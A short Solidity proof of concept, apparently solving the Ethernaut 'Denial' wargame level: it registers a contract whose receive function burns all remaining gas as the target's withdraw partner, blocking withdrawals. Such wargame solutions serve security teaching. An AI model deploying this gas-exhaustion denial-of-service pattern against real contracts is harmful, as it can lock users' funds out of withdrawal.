//
pragma solidity ^0.8.0;

import "Ethernaut/denial.sol";

contract DenialPoc
{
  Denial denial;

  constructor(address payable _denial)
  {
    denial = Denial(_denial);
  }

  function exploit() public 
  {
    Partner partner = new Partner();
    denial.setWithdrawPartner(address(partner));
  }

}

contract Partner
{
  uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}